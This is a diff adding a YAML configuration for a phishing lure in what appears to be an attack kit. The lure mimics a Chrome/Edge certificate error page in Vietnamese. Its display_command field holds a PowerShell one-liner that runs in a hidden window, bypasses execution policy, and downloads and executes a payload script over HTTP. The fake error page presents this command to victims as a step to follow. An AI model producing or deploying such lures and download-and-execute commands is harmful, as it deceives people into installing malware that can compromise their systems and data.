@@ -1,0 +1,21 @@
+# Error Handler Lure
+# Mimics Chrome/Edge certificate error page (NET::ERR_CERT_AUTHORITY_INVALID)
+
+type: error
+template: lures/error_handler.html
+route: /loi-sertifikat
+
+payload:
+  script: "default.js"
+
+content:
+  title: "Kết nối của bạn không riêng tư"
+  site_name: "secure-portal.net"
+  cert_from: "01/01/2025"
+  cert_expiry: "01/01/2024"
+  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""
+
+styles:
+  theme: "chrome"
+  primary_color: "#1a73e8"
+  error_color: "#d93025"
